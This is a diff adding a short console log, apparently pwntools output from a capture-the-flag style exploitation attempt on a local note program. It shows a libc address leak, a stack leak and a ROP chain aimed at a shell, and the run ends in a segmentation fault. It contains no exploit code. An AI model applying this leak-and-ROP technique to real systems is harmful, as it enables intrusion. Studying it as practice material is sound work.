@@ -1,0 +1,16 @@
+[x] Starting local process './ld-linux-x86-64.so.2'
+[+] Starting local process './ld-linux-x86-64.so.2': pid 3223
+[*] --- BƯỚC 1: LEAK LIBC ---
+[+] Libc Base: 0x7100820ab000
+[*] --- BƯỚC 2: LEAK STACK ---
+[+] Stack Leak: 0x7ffea2a64d58
+[*] --- BƯỚC 3: ROP TO SHELL ---
+[+] Return Address of add(): 0x7ffea2a64c08
+[+] Target Aligned (RBP location): 0x7ffea2a64c00
+[*] Loaded 131 cached gadgets for './libc.so.6'
+[*] Đang nạp ROP Chain...
+[*] Switching to interactive mode
+Note created!
+[*] Got EOF while reading in interactive
+[*] Interrupted
+[*] Process './ld-linux-x86-64.so.2' stopped with exit code -11 (SIGSEGV) (pid 3223)
